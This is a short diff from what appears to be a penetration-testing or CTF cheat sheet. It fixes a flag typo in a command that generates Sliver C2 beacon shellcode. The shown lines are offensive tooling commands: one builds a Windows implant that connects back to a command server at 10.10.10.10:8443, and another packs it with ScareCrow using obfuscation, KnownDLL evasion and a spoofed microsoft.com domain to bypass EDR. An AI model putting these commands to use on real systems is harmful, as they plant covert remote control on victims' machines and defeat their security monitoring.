@@ -150,7 +150,7 @@ Shellcode generation
 [[ScareCrow]] and `upx` for the CTF-level bypass of EDR - [Alh4zr3d](https://www.youtube.com/@alh4zr3d3)
 ```bash
 # Generate sliver beacon shellcode disabling shikata ga nai
-generate beacon ---mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
+generate beacon --mtls  10.10.10.10:8443 --arch amd64 --os windows --save /tmp/8443-sliver.bin -f shellcode -G
 # use 
 /opt/ScareCrow/ScareCrow -I /tmp/8443-sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
 # Build with golang
